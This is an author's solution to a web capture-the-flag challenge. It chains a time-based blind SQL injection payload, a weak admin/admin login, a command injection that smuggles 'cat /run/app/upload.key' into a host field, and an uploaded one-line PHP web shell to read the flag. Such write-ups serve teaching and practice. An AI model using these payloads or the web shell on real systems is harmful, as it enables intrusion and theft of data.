# Author solution

## Vulnerability chain

1. `/search.php?q=` concatenates input into a MariaDB `LIKE` expression:

   ```sql
   SELECT id,name FROM secrets WHERE name LIKE '%$q%'
   ```

   Use a time oracle to extract rows from `secrets.value`.

2. The intended timing payload starts with a normal character before the quote:

   ```text
   x' OR IF(ASCII(SUBSTRING((SELECT value FROM secrets WHERE name='diag_key'),1,1))=100,SLEEP(1),0)-- -
   ```

   The leading `x` prevents the original `LIKE '%'` fragment from being trivially true before the injected `OR IF(...)` branch is evaluated.

3. Extract:

   ```text
   diag_key = diag-console-4b71
   upload_key = vault-upload-9f2c
   ```

4. Log in at `/login.php` with:

   ```text
   admin/admin
   ```

5. Submit the diagnostic key to `/diagnose.php`. The `host` value is passed to `shell_exec` without quoting:

   ```text
   127.0.0.1; cat /run/app/upload.key
   ```

6. Upload `shell.phtml` with:

   ```php
   <?php system($_GET['c'] ?? 'id'); ?>
   ```

   The upload filter allows `.phtml`, and `uploads/.htaccess` enables PHP execution for that extension.

7. Request:

   ```text
   /uploads/shell.phtml?c=cat%20/var/www/html/uploads/.vault_flag
   ```

   The flag is generated with fresh randomness on the first valid upload, so it changes after a clean reset.

## Python verification

```powershell
& "C:\Users\h'p\AppData\Local\Programs\Python\Python313\python.exe" D:\ctfweb\scripts\solve.py http://127.0.0.1:8088/
```

The script performs the full chain with `requests`: timing extraction, weak-password login, command injection, `.phtml` upload, and flag read.
